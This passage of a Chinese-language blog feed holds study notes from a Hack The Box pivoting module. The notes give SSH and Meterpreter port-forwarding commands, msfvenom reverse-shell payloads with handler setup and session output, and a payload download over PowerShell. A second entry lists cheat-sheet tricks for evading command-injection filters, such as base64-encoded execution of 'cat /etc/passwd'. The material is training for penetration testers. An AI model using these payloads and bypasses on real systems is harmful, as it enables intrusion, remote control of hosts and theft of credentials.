overruns 0  frame 0        TX packets 270  bytes 22432 (22.4 KB)        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</code></pre><p>与之前我们知道要访问哪个端口的情况不同，在当前的情况下，我们不知道网络的另一端有哪些服务。因此，我们可以扫描网络（172.16.5.1-200）网络或整个子网（172.16.5.0&#x2F;23）上较小范围的IP。我们无法直接从攻击主机执行此扫描，因为它没有到172.16.5.0&#x2F;22网络的路由。要做到这一点，我们必须通过Ubuntu服务器执行动态端口转发和调整网络数据包。我们可以通过在本地主机（个人攻击主机或Pwnbox）上启动SOCKS侦听器来实现这一点，然后配置SSH，以便在连接到目标主机后通过SSH将该流量转发到网络（172.16.5.0&#x2F;23）。 这称为通过SOCKS代理的SSH隧道。SOCKS代表Socket Secure，这是一种有助于与有防火墙限制的服务器通信的协议。与大多数情况下启动连接以连接到服务不同，在SOCKS的情况下，初始流量由SOCKS客户端生成，该客户端连接到由想要访问客户端上的服务的用户控制的SOCKS服务器。一旦建立了连接，就可以代表连接的客户端通过SOCKS服务器路由网络流量。 这种技术通常用于规避防火墙的限制，并允许外部实体绕过防火墙，访问防火墙环境中的服务。使用SOCKS代理进行数据透视和转发的另一个好处是，SOCKS代理可以通过创建从NAT网络到外部服务器的路由进行透视。SOCKS代理目前有两种类型：SOCKS4和SOCKS5。SOCKS4不提供任何身份验证和UDP支持，而SOCKS5提供了这些支持。让我们举一个下图的例子，我们有一个172.16.5.0&#x2F;23的NAT网络，我们不能直接访问它。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308291135490.png" alt="img"></p><p>在上图中，攻击主机启动SSH客户端，并请求SSH服务器允许其通过SSH套接字发送一些TCP数据。SSH服务器以确认进行响应，然后SSH客户端开始在localhost:9050上侦听。您在此处发送的任何数据都将通过SSH广播到整个网络（172.16.5.0&#x2F;23）。我们可以使用以下命令来执行此动态端口转发。</p><h4 id="Enabling-Dynamic-Port-Forwarding-with-SSH"><a href="#Enabling-Dynamic-Port-Forwarding-with-SSH" class="headerlink" title="Enabling Dynamic Port Forwarding with SSH"></a>Enabling Dynamic Port Forwarding with SSH</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ssh -D 9050 ubuntu@10.129.202.64</code></pre><p>-D参数请求SSH服务器启用动态端口转发。一旦我们启用了这一功能，我们将需要一个可以通过端口9050路由任何工具的数据包的工具。我们可以使用proxychains工具来实现这一点，该工具能够通过TOR、SOCKS和HTTP&#x2F;HTTPS代理服务器重定向TCP连接，还允许我们将多个代理服务器链接在一起。使用proxychains，我们也可以隐藏请求主机的IP地址，因为接收主机只能看到透视主机的IP。Proxychains通常用于强制应用程序的TCP流量通过托管代理，如SOCKS4&#x2F;SOCKS5、TOR或HTTP&#x2F;HTTPS代理。 要通知proxychans我们必须使用端口9050，我们必须修改位于&#x2F;etc&#x2F;proxychans.conf的proxychans配置文件。如果最后一行还没有socks4 127.0.0.1 9050，那么我们可以将其添加到最后一行。</p><pre><code class="shell-session">Tanin@htb[/htb]$ tail -4 /etc/proxychains.conf# meanwile# defaults set to &quot;tor&quot;socks4 127.0.0.1 9050</code></pre><p>现在，当您使用以下命令使用proxychains启动Nmap时，它将把Nmap的所有数据包路由到本地端口9050，我们的SSH客户端正在侦听该端口，该端口将通过SSH将所有数据包转发到172.16.5.0&#x2F;23网络。</p><pre><code class="shell-session">Tanin@htb[/htb]$ proxychains nmap -v -sn 172.16.5.1-200</code></pre><p>使用proxychains打包所有Nmap数据并将其转发到远程服务器的这一部分称为SOCKS隧道。这里需要记住的一个更重要的注意事项是，我们只能在proxychain上执行完整的TCP连接扫描。原因是代理主机无法理解部分数据包。如果发送部分数据包（如半连接扫描），则会返回不正确的结果。我们还需要确保意识到主机活动检查可能无法针对Windows目标，因为Windows Defender防火墙默认情况下会阻止ICMP请求（传统ping）。 在整个网络范围内不进行ping的完整TCP连接扫描将花费很长时间。因此，对于本模块，我们将主要关注扫描单个主机，或我们知道的活动的较小范围的主机，在这种情况下，它将是172.16.5.19的Windows主机。 我们将使用以下命令执行远程系统扫描。</p><pre><code class="shell-session">Tanin@htb[/htb]$ proxychains nmap -v -Pn -sT 172.16.5.19</code></pre><p>Nmap扫描显示了几个打开的端口，其中一个是RDP端口（3389）。与Nmap扫描类似，我们还可以通过proxychans调整msfconsole，使用Metasploit辅助模块执行易受攻击的RDP扫描。我们可以用proxychains启动msfconsole。</p><h2 id="Using-Metasploit-with-Proxychains"><a href="#Using-Metasploit-with-Proxychains" class="headerlink" title="Using Metasploit with Proxychains"></a>Using Metasploit with Proxychains</h2><p>我们还可以使用proxychains打开Metasploit，并通过我们建立的代理发送所有相关流量。</p><pre><code class="shell-session">Tanin@htb[/htb]$ proxychains msfconsole</code></pre><p>让我们使用rdp_scanner辅助模块来检查内部网络上的主机是否正在监听3389。</p><pre><code class="shell-session">msf6 &gt; search rdp_scannerrun：[*] 172.16.5.19:3389      - Detected RDP on 172.16.5.19:3389      (name:DC01) (domain:INLANEFREIGHT) main_fqdn:inlanefreight.local) (server_fqdn:DC01.inlanefreight.local) (os_version:10.0.17763) (RequirNLA: No)[*] 172.16.5.19:3389      - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed</code></pre><p>在上面输出的底部，我们可以看到RDP端口与Windows操作系统版本一起打开。 根据评估期间我们对此主机的访问级别，我们可能会尝试运行漏洞攻击或使用收集的凭据登录。对于此模块，我们将通过SOCKS隧道登录到Windows远程主机。这可以使用xfreerdp来完成。我们案例中的用户是胜利者，密码是pass@123</p><h4 id="Using-xfreerdp-with-Proxychains"><a href="#Using-xfreerdp-with-Proxychains" class="headerlink" title="Using xfreerdp with Proxychains"></a>Using xfreerdp with Proxychains</h4><pre><code class="shell-session">Tanin@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123</code></pre><h2 id="practice"><a href="#practice" class="headerlink" title="practice"></a>practice</h2><p>应用本节中教授的概念，转向内部网络并使用RDP（凭据：victor:pass@123)以控制172.16.5.19上的Windows目标。提交桌面上Flag.txt的内容。</p><p>这里使用ssh -D 然后配置proxychain代理就可以轻松连接，个人感觉ssh -L也可以，但是缺陷是只能指定某个端口映射，这可能导致当常用服务与其常用端口不匹配时，转发出去的端口</p><h1 id="Remote-x2F-Reverse-Port-Forwarding-with-SSH"><a href="#Remote-x2F-Reverse-Port-Forwarding-with-SSH" class="headerlink" title="Remote&#x2F;Reverse Port Forwarding with SSH"></a>Remote&#x2F;Reverse Port Forwarding with SSH</h1><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308291509662.png" alt="img"></p><p>如果我们试图获得一个反向外壳，会发生什么呢？ Windows主机的传出连接仅限于172.16.5.0&#x2F;23网络。这是因为Windows主机与攻击主机所在的网络没有任何直接连接。如果我们在攻击主机上启动Metasploit侦听器并尝试获取反向shell，我们将无法在此处获得直接连接，因为Windows服务器不知道如何路由离开其网络（172.16.5.0&#x2F;23）的流量以到达10.129.x.x（Academy Lab网络）。 在渗透测试过程中，有几次只有远程桌面连接是不可行的。您可能需要上载&#x2F;下载文件（当RDP剪贴板被禁用时），使用漏洞利用或低级Windows API使用Metermeter会话在Windows主机上执行枚举，而使用内置的Windows可执行文件是不可能的。 在这些情况下，我们必须找到一个枢轴主机，这是我们的攻击主机和Windows服务器之间的常见连接点。在我们的案例中，我们的中枢主机将是Ubuntu服务器，因为它可以连接到我们的攻击主机和Windows目标。为了在Windows上获得Meterpeter外壳，我们将使用msfvenom创建MeterpeterHTTPS负载，但负载的反向连接配置为Ubuntu服务器的主机IP地址（172.16.5.129）。我们将使用Ubuntu服务器上的端口8080将所有反向数据包转发到攻击主机的8000端口，Metasploit侦听器正在该端口运行。</p><h4 id="Creating-a-Windows-Payload-with-msfvenom"><a href="#Creating-a-Windows-Payload-with-msfvenom" class="headerlink" title="Creating a Windows Payload with msfvenom"></a>Creating a Windows Payload with msfvenom</h4><pre><code class="shell-session"> msfvenom -p windows/x64/meterpreter/reverse_https lhost= &lt;InternalIPofPivotHost&gt; -f exe -o backupscript.exe LPORT=8080</code></pre><h4 id="Configuring-amp-Starting-the-multi-x2F-handler"><a href="#Configuring-amp-Starting-the-multi-x2F-handler" class="headerlink" title="Configuring &amp; Starting the multi&#x2F;handler"></a>Configuring &amp; Starting the multi&#x2F;handler</h4><pre><code class="shell-session">msf6 &gt; use exploit/multi/handler[*] Using configured payload generic/shell_reverse_tcpmsf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_httpspayload =&gt; windows/x64/meterpreter/reverse_httpsmsf6 exploit(multi/handler) &gt; set lhost 0.0.0.0lhost =&gt; 0.0.0.0msf6 exploit(multi/handler) &gt; set lport 8000lport =&gt; 8000msf6 exploit(multi/handler) &gt; run[*] Started HTTPS reverse handler on https://0.0.0.0:8000</code></pre><p>一旦创建了有效负载，并且配置并运行了侦听器，我们就可以使用scp命令将有效负载复制到Ubuntu服务器，因为我们已经有了使用SSH连接到Ubuntu服务器的凭据。</p><pre><code class="shell-session">Tanin@htb[/htb]$ scp backupscript.exe ubuntu@&lt;ipAddressofTarget&gt;:~/backupscript.exe                                   100% 7168    65.4KB/s   00:00 </code></pre><p>复制有效负载后，我们将在复制有效负载的同一目录中的Ubuntu服务器上使用以下命令启动python3HTTP服务器。</p><h4 id="Starting-Python3-Webserver-on-Pivot-Host"><a href="#Starting-Python3-Webserver-on-Pivot-Host" class="headerlink" title="Starting Python3 Webserver on Pivot Host"></a>Starting Python3 Webserver on Pivot Host</h4><pre><code class="shell-session">ubuntu@Webserver$ python3 -m http.server 8123</code></pre><h4 id="Downloading-Payload-from-Windows-Target"><a href="#Downloading-Payload-from-Windows-Target" class="headerlink" title="Downloading Payload from Windows Target"></a>Downloading Payload from Windows Target</h4><p>我们可以通过web浏览器或PowerShell cmdlet Invoke-WebRequest从Windows主机下载此备份脚本.exe。</p><pre><code class="powershell-session">PS C:\Windows\system32&gt; Invoke-WebRequest -Uri &quot;http://172.16.5.129:8123/backupscript.exe&quot; -OutFile &quot;C:\backupscript.exe&quot;</code></pre><p>一旦我们在Windows主机上下载了负载，我们将使用SSH远程端口转发将msfconsole在8000端口上的侦听器服务转发到Ubuntu服务器的8080端口。我们将在SSH命令中使用-vN参数，使其变得详细，并要求它不要提示登录shell。-R命令要求Ubuntu服务器侦听<targetIPaddress>:8080，并将端口8080上的所有传入连接转发到我们攻击主机0.0.0.0:8000上的msfconsole侦听器。</p><pre><code class="shell-session">Tanin@htb[/htb]$ ssh -R &lt;InternalIPofPivotHost&gt;:8080:0.0.0.0:8000 ubuntu@&lt;ipAddressofTarget&gt; -vN</code></pre><p>在创建SSH远程端口转发后，我们可以从Windows目标执行负载。如果有效负载按预期执行并尝试连接回侦听器，我们可以在pivot主机上看到来自pivot的日志。</p><p>如果一切设置正确，我们将通过Ubuntu服务器收到一个Meterpeter shell。</p><h4 id="Meterpreter-Session-Established"><a href="#Meterpreter-Session-Established" class="headerlink" title="Meterpreter Session Established"></a>Meterpreter Session Established</h4><pre><code class="shell-session">[*] Started HTTPS reverse handler on https://0.0.0.0:8000[!] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Without a database connected that payload UUID tracking will not work![*] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Staging x64 payload (201308 bytes) ...[!] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Without a database connected that payload UUID tracking will not work![*] Meterpreter session 1 opened (127.0.0.1:8000 -&gt; 127.0.0.1 ) at 2022-03-02 10:48:10 -0500meterpreter &gt; shellProcess 3236 created.Channel 1 created.Microsoft Windows [Version 10.0.17763.1637](c) 2018 Microsoft Corporation. All rights reserved.C:\&gt;</code></pre><p>Meterpeter会话应该列出我们的传入连接来自本地主机本身（127.0.0.1），因为我们通过本地SSH套接字接收连接，该套接字创建了到Ubuntu服务器的出站连接。发出netstat命令可以向我们显示传入连接来自SSH服务。 下面的图形表示提供了理解该技术的另一种方式。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308291516188.png" alt="img"></p><pre><code class="powershell-session"> Invoke-WebRequest -Uri &quot;http://10.129.147.31:8123/backdoor.exe&quot; -OutFile &quot;C:\backdoor&quot;</code></pre><h1 id="Meterpreter-Tunneling-amp-Port-Forwarding"><a href="#Meterpreter-Tunneling-amp-Port-Forwarding" class="headerlink" title="Meterpreter Tunneling &amp; Port Forwarding"></a>Meterpreter Tunneling &amp; Port Forwarding</h1><h4 id="Creating-Payload-for-Ubuntu-Pivot-Host"><a href="#Creating-Payload-for-Ubuntu-Pivot-Host" class="headerlink" title="Creating Payload for Ubuntu Pivot Host"></a>Creating Payload for Ubuntu Pivot Host</h4><pre><code class="shell-session">Tanin@htb[/htb]$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080</code></pre><p>在复制有效负载之前，我们可以启动一个 <a href="https://www.rapid7.com/db/modules/exploit/multi/handler/">multi&#x2F;handler</a>，也称为GenericPayloadHandler。</p><pre><code class="shell-session">msf6 &gt; use exploit/multi/handler</code></pre><p>我们可以通过SSH将备份作业二进制文件复制到Ubuntu pivot主机，并执行它以获得Meterpeter会话。</p><p>我们需要确保在执行有效载荷时成功建立MeterMeter会话。</p><h4 id="Meterpreter-Session-Establishment"><a href="#Meterpreter-Session-Establishment" class="headerlink" title="Meterpreter Session Establishment"></a>Meterpreter Session Establishment</h4><p>我们知道Windows目标位于172.16.5.0&#x2F;23网络上。因此，假设Windows目标上的防火墙允许ICMP请求，我们希望在此网络上执行ping扫描。我们可以使用带有ping_sweep模块的Meterpeter来实现这一点，该模块将生成从Ubuntu主机到网络的ICMP流量172.16.5.0&#x2F;23。</p><h4 id="Ping-Sweep"><a href="#Ping-Sweep" class="headerlink" title="Ping Sweep"></a>Ping Sweep</h4><pre><code class="shell-session">meterpreter &gt; run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23[*] Performing ping sweep for IP range 172.16.5.0/23</code></pre><p>我们还可以直接在目标枢轴主机上使用for循环执行ping扫描，该主机将ping我们指定的网络范围内的任何设备。这里有两个有用的ping扫描循环一行，我们可以用于基于Linux和基于Windows的枢轴主机。</p><pre><code class="shell-session">for i in &#123;1..254&#125; ;do (ping -c 1 172.16.5.$i | grep &quot;bytes from&quot; &amp;) ;done</code></pre><pre><code class="cmd-session">for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find &quot;Reply&quot;</code></pre><pre><code class="powershell-session">1..254 | % &#123;&quot;172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)&quot;&#125;</code></pre><p>注意：ping扫描可能不会在第一次尝试时成功回复，尤其是在跨网络通信时。这可能是由主机构建其arp缓存所需的时间造成的。在这些情况下，最好尝试至少两次ping扫描，以确保构建arp缓存。</p><p>在某些情况下，主机的防火墙会阻止ping（ICMP），而ping不会成功回复我们。在这些情况下，我们可以使用Nmap在172.16.5.0&#x2F;23网络上执行TCP扫描。我们还可以使用Metasploit的漏洞利用后路由模块socks_proxy在攻击主机上配置本地代理，而不是使用SSH进行端口转发。我们将为SOCKS版本4a配置SOCKS代理。此SOCKS配置将在端口9050上启动一个侦听器，并路由通过MeterMeter会话接收的所有流量。</p><h4 id="Configuring-MSF’s-SOCKS-Proxy"><a href="#Configuring-MSF’s-SOCKS-Proxy" class="headerlink" title="Configuring MSF’s SOCKS Proxy"></a>Configuring MSF’s SOCKS Proxy</h4><pre><code class="shell-session">msf6 &gt; use auxiliary/server/socks_proxy</code></pre><pre><code class="shell-session">msf6 auxiliary(server/socks_proxy) &gt; set SRVPORT 9050SRVPORT =&gt; 9050msf6 auxiliary(server/socks_proxy) &gt; set SRVHOST 0.0.0.0SRVHOST =&gt; 0.0.0.0msf6 auxiliary(server/socks_proxy) &gt; set version 4aversion =&gt; 4amsf6 auxiliary(server/socks_proxy) &gt; run[*] Auxiliary module running as background job 0.[*] Starting the SOCKS proxy servermsf6 auxiliary(server/socks_proxy) &gt; optionsModule options (auxiliary/server/socks_proxy):   Name     Current Setting  Required  Description   ----     ---------------  --------  -----------   SRVHOST  0.0.0.0          yes       The address to listen on   SRVPORT  9050             yes       The port to listen on   VERSION  4a               yes       The SOCKS version to use (Accepted: 4a,                                        5)Auxiliary action:   Name   Description   ----   -----------   Proxy  Run a SOCKS proxy server</code></pre><h4 id="Confirming-Proxy-Server-is-Running"><a href="#Confirming-Proxy-Server-is-Running" class="headerlink" title="Confirming Proxy Server is Running"></a>Confirming Proxy Server is Running</h4><pre><code class="shell-session">msf6 auxiliary(server/socks_proxy) &gt; jobsJobs====  Id  Name                           Payload  Payload opts  --  ----                           -------  ------------  0   Auxiliary: server/socks_proxy</code></pre><p>在启动SOCKS服务器后，我们将配置proxychans，通过我们在受损的Ubuntu主机上的枢轴来路由其他工具（如Nmap）生成的流量。如果还没有，我们可以在&#x2F;etc&#x2F;proxychain.conf的proxychain.onf文件的末尾添加以下行。</p><pre><code class="shell-session">socks4 127.0.0.1 9050</code></pre><p>注意：根据SOCKS服务器运行的版本，我们可能偶尔需要在proxyains.conf中将socks4更改为socks5。</p><h4 id="Creating-Routes-with-AutoRoute"><a href="#Creating-Routes-with-AutoRoute" class="headerlink" title="Creating Routes with AutoRoute"></a>Creating Routes with AutoRoute</h4><pre><code class="shell-session">msf6 &gt; use post/multi/manage/autoroutemsf6 post(multi/manage/autoroute) &gt; set SESSION 1SESSION =&gt; 1msf6 post(multi/manage/autoroute) &gt; set SUBNET 172.16.5.0SUBNET =&gt; 172.16.5.0msf6 post(multi/manage/autoroute) &gt; run</code></pre><p>也可以通过从MeterMeter会话运行自动路由来添加具有自动路由的路由。</p><pre><code class="shell-session">meterpreter &gt; run autoroute -s 172.16.5.0/23</code></pre><p>添加必要的路由后，我们可以使用-p选项列出活动路由，以确保我们的配置按预期应用。</p><pre><code class="shell-session">meterpreter &gt; run autoroute -p[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.[!] Example: run post/multi/manage/autoroute OPTION=value [...]Active Routing Table====================   Subnet             Netmask            Gateway   ------             -------            -------   10.129.0.0         255.255.0.0        Session 1   172.16.4.0         255.255.254.0      Session 1   172.16.5.0         255.255.254.0      Session 1</code></pre><p>从上面的输出中可以看出，该路由已添加到172.16.5.0&#x2F;23网络中。我们现在可以使用proxychans通过MeterMeter会话路由我们的Nmap流量。</p><pre><code class="shell-session">Tanin@htb[/htb]$ proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn</code></pre><h2 id="Port-Forwarding"><a href="#Port-Forwarding" class="headerlink" title="Port Forwarding"></a>Port Forwarding</h2><p>端口转发也可以使用Meterpeter的portfwd模块来完成。我们可以在我们的攻击主机上启用侦听器，并请求Meterpeter通过Metermeter会话将在该端口上接收到的所有数据包转发到172.16.5.0&#x2F;23网络上的远程主机。</p><pre><code class="shell-session">meterpreter &gt; help portfwdUsage: portfwd [-h] [add | delete | list | flush] [args]OPTIONS:</code></pre><h4 id="Creating-Local-TCP-Relay"><a href="#Creating-Local-TCP-Relay" class="headerlink" title="Creating Local TCP Relay"></a>Creating Local TCP Relay</h4><pre><code class="shell-session">meterpreter &gt; portfwd add -l 3300 -p 3389 -r 172.16.5.19</code></pre><p>上述命令请求Metereter会话在我们的攻击主机的本地端口（-l）3300上启动一个侦听器，并通过我们的Meter会话将所有数据包转发到3389端口（-p）上的远程（-r）Windows服务器172.16.5.19。现在，如果我们在localhost:3300上执行xfreerdp，我们将能够创建一个远程桌面会话。</p><h4 id="Connecting-to-Windows-Target-through-localhost"><a href="#Connecting-to-Windows-Target-through-localhost" class="headerlink" title="Connecting to Windows Target through localhost"></a>Connecting to Windows Target through localhost</h4><pre><code class="shell-session">Tanin@htb[/htb]$ xfreerdp /v:localhost:3300 /u:victor /p:pass@123</code></pre><h4 id="Netstat-Output"><a href="#Netstat-Output" class="headerlink" title="Netstat Output"></a>Netstat Output</h4><p>我们可以使用Netstat来查看有关我们最近建立的会话的信息。从防御的角度来看，如果我们怀疑主机被破坏，我们可能会从使用Netstat中受益。这使我们能够查看主机建立的任何会话。</p><pre><code class="shell-session">Tanin@htb[/htb]$ netstat -antptcp        0      0 127.0.0.1:54652         127.0.0.1:3300          ESTABLISHED 4075/xfreerdp </code></pre><hr><h2 id="Meterpreter-Reverse-Port-Forwarding"><a href="#Meterpreter-Reverse-Port-Forwarding" class="headerlink" title="Meterpreter Reverse Port Forwarding"></a>Meterpreter Reverse Port Forwarding</h2><p>与本地端口转发类似，Metasploit也可以使用以下命令执行反向端口转发，您可能希望监听受损服务器上的特定端口，并将所有来自Ubuntu服务器的shell转发到我们的攻击主机。我们将在Windows攻击主机的新端口上启动一个侦听器，并请求Ubuntu服务器将在端口1234上接收到的所有请求转发到我们在端口8081上的侦听器。 我们可以使用下面的命令在前面的场景中的现有shell上创建反向端口转发。该命令将Ubuntu服务器上运行的1234端口上的所有连接转发到本地端口（-l）8081上的攻击主机。我们还将配置我们的侦听器，以便在Windows外壳的8081端口上侦听。</p><h4 id="Reverse-Port-Forwarding-Rules"><a href="#Reverse-Port-Forwarding-Rules" class="headerlink" title="Reverse Port Forwarding Rules"></a>Reverse Port Forwarding Rules</h4><pre><code class="shell-session">meterpreter &gt; portfwd add -R -l 8081 -p 1234 -L 10.10.14.18[*] Local TCP relay created: 10.10.14.18:8081 &lt;-&gt; :1234</code></pre><h4 id="Configuring-amp-Starting-multi-x2F-handler"><a href="#Configuring-amp-Starting-multi-x2F-handler" class="headerlink" title="Configuring &amp; Starting multi&#x2F;handler"></a>Configuring &amp; Starting multi&#x2F;handler</h4><pre><code class="shell-session">meterpreter &gt; bg[*] Backgrounding session 1...msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcppayload =&gt; windows/x64/meterpreter/reverse_tcpmsf6 exploit(multi/handler) &gt; set LPORT 8081 LPORT =&gt; 8081msf6 exploit(multi/handler) &gt; set LHOST 0.0.0.0 LHOST =&gt; 0.0.0.0msf6 exploit(multi/handler) &gt; run[*] Started reverse TCP handler on 0.0.0.0:8081 </code></pre><p>我们现在可以创建一个反向shell负载，当在Windows主机上执行时，该负载将在172.16.5.129:1234上将连接发送回我们的Ubuntu服务器。一旦我们的Ubuntu服务器接收到这个连接，它就会转发这个连接来攻击我们配置的主机的ip:8081。</p><h4 id="Establishing-the-Meterpreter-session"><a href="#Establishing-the-Meterpreter-session" class="headerlink" title="Establishing the Meterpreter session"></a>Establishing the Meterpreter session</h4><pre><code class="shell-session">[*] Started reverse TCP handler on 0.0.0.0:8081 [*] Sending stage (200262 bytes) to 10.10.14.18[*] Meterpreter session 2 opened (10.10.14.18:8081 -&gt; 10.10.14.18:40173 ) at 2022-03-04 15:26:14 -0500meterpreter &gt; shellProcess 2336 created.Channel 1 created.Microsoft Windows [Version 10.0.17763.1637](c) 2018 Microsoft Corporation. All rights reserved.C:\&gt;</code></pre>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Introduction-to-Pivoting-Tunneling-and-Port-Forwarding&quot;&gt;&lt;a href=&quot;#Introduction-to-Pivoting-Tunneling-and-Port-Forwarding&quot; class=&quot;headerlink&quot; title=&quot;Introduction to Pivoting, Tunneling, and Port Forwarding&quot;&gt;&lt;/a&gt;Introduction to Pivoting, Tunneling, and Port Forwarding&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://academy.hackthebox.com/storage/modules/158/PivotingandTunnelingVisualized.gif&quot; alt=&quot;img&quot;&gt;&lt;/p&gt;
&lt;p&gt;在红队参与、渗透测试或Active Directory评估期间，我们经常会发现自己可能已经泄露了移动到另一台主机所需的凭据、ssh密钥、哈希或访问令牌，但可能没有其他主机可以从我们的攻击主机直接访问。在这种情况下，我们可能需要使用一个我们已经妥协的枢轴主机来找到通往下一个目标的方法。第一次登录主机时，最重要的事情之一是检查我们的权限级别、网络连接以及潜在的VPN或其他远程访问软件。如果一台主机有多个网络适配器，我们可能会使用它来移动到不同的网段。Pivoting本质上是指通过受损的主机转移到其他网络，在不同的网段上找到更多目标。&lt;/p&gt;</summary>
    
    
    
    
    <category term="base" scheme="https://taninluv.github.io/tags/base/"/>
    
  </entry>
  
  <entry>
    <title>command injections</title>
    <link href="https://taninluv.github.io/2023/08/24/command-injections/"/>
    <id>https://taninluv.github.io/2023/08/24/command-injections/</id>
    <published>2023-08-24T09:53:07.000Z</published>
    <updated>2023-08-27T08:11:45.391Z</updated>
    
    <content type="html"><![CDATA[<p>检测基本操作系统命令注入漏洞的过程与利用此类漏洞的过程相同。我们试图通过各种注入方法附加我们的命令。如果命令输出与预期的通常结果不同，则我们已成功利用该漏洞。对于更高级的命令注入漏洞，情况可能并非如此，因为我们可能会利用各种模糊方法或代码审查来识别潜在的命令注入弱点。然后，我们可以逐步构建我们的有效载荷，直到我们实现命令注入。</p><span id="more"></span><h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h2 id="Filtered-Character-Bypass"><a href="#Filtered-Character-Bypass" class="headerlink" title="Filtered Character Bypass"></a>Filtered Character Bypass</h2><table><thead><tr><th>Code</th><th>Description</th></tr></thead><tbody><tr><td><code>printenv</code></td><td>Can be used to view all environment variables</td></tr><tr><td><strong>Spaces</strong></td><td></td></tr><tr><td><code>%09</code></td><td>Using tabs instead of spaces</td></tr><tr><td><code>$&#123;IFS&#125;</code></td><td>Will be replaced with a space and a tab. Cannot be used in sub-shells (i.e. <code>$()</code>)</td></tr><tr><td><code>&#123;ls,-la&#125;</code></td><td>Commas will be replaced with spaces</td></tr><tr><td><strong>Other Characters</strong></td><td></td></tr><tr><td><code>$&#123;PATH:0:1&#125;</code></td><td>Will be replaced with <code>/</code></td></tr><tr><td><code>$&#123;LS_COLORS:10:1&#125;</code></td><td>Will be replaced with <code>;</code></td></tr><tr><td><code>$(tr &#39;!-&#125;&#39; &#39;&quot;-~&#39;&lt;&lt;&lt;[)</code></td><td>Shift character by one (<code>[</code> -&gt; <code>\</code>)</td></tr></tbody></table><hr><h2 id="Blacklisted-Command-Bypass"><a href="#Blacklisted-Command-Bypass" class="headerlink" title="Blacklisted Command Bypass"></a>Blacklisted Command Bypass</h2><table><thead><tr><th>Code</th><th>Description</th></tr></thead><tbody><tr><td><strong>Character Insertion</strong></td><td></td></tr><tr><td><code>&#39;</code> or <code>&quot;</code></td><td>Total must be even</td></tr><tr><td><code>$@</code> or <code>\</code></td><td>Linux only</td></tr><tr><td><strong>Case Manipulation</strong></td><td></td></tr><tr><td><code>$(tr &quot;[A-Z]&quot; &quot;[a-z]&quot;&lt;&lt;&lt;&quot;WhOaMi&quot;)</code></td><td>Execute command regardless of cases</td></tr><tr><td><code>$(a=&quot;WhOaMi&quot;;printf %s &quot;$&#123;a,,&#125;&quot;)</code></td><td>Another variation of the technique</td></tr><tr><td><strong>Reversed Commands</strong></td><td></td></tr><tr><td>&#96;echo ‘whoami’</td><td>rev&#96;</td></tr><tr><td><code>$(rev&lt;&lt;&lt;&#39;imaohw&#39;)</code></td><td>Execute reversed command</td></tr><tr><td><strong>Encoded Commands</strong></td><td></td></tr><tr><td>&#96;echo -n ‘cat &#x2F;etc&#x2F;passwd</td><td>grep 33’</td></tr><tr><td><code>bash&lt;&lt;&lt;$(base64 -d&lt;&lt;&lt;Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)</code></td><td>Execute b64 encoded string</td></tr></tbody></table><hr><h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h2 id="Filtered-Character-Bypass-1"><a href="#Filtered-Character-Bypass-1" class="headerlink" title="Filtered Character Bypass"></a>Filtered Character Bypass</h2><table><thead><tr><th>Code</th><th>Description</th></tr></thead><tbody><tr><td><code>Get-ChildItem Env:</code></td><td>Can be used to view all environment variables - (PowerShell)</td></tr><tr><td><strong>Spaces</strong></td><td></td></tr><tr><td><code>%09</code></td><td>Using tabs instead of spaces</td></tr><tr><td><code>%PROGRAMFILES:~10,-5%</code></td><td>Will be replaced with a space - (CMD)</td></tr><tr><td><code>$env:PROGRAMFILES[10]</code></td><td>Will be replaced with a space - (PowerShell)</td></tr><tr><td><strong>Other Characters</strong></td><td></td></tr><tr><td><code>%HOMEPATH:~0,-17%</code></td><td>Will be replaced with <code>\</code> - (CMD)</td></tr><tr><td><code>$env:HOMEPATH[0]</code></td><td>Will be replaced with <code>\</code> - (PowerShell)</td></tr></tbody></table><hr><h2 id="Blacklisted-Command-Bypass-1"><a href="#Blacklisted-Command-Bypass-1" class="headerlink" title="Blacklisted Command Bypass"></a>Blacklisted Command Bypass</h2><table><thead><tr><th>Code</th><th>Description</th></tr></thead><tbody><tr><td><strong>Character Insertion</strong></td><td></td></tr><tr><td><code>&#39;</code> or <code>&quot;</code></td><td>Total must be even</td></tr><tr><td><code>^</code></td><td>Windows only (CMD)</td></tr><tr><td><strong>Case Manipulation</strong></td><td></td></tr><tr><td><code>WhoAmi</code></td><td>Simply send the character with odd cases</td></tr><tr><td><strong>Reversed Commands</strong></td><td></td></tr><tr><td><code>&quot;whoami&quot;[-1..-20] -join &#39;&#39;</code></td><td>Reverse a string</td></tr><tr><td><code>iex &quot;$(&#39;imaohw&#39;[-1..-20] -join &#39;&#39;)&quot;</code></td><td>Execute reversed command</td></tr><tr><td><strong>Encoded Commands</strong></td><td></td></tr><tr><td><code>[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(&#39;whoami&#39;))</code></td><td>Encode a string with base64</td></tr><tr><td><code>iex &quot;$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(&#39;dwBoAG8AYQBtAGkA&#39;)))&quot;</code></td><td>Execute b64 encoded string</td></tr></tbody></table><h2 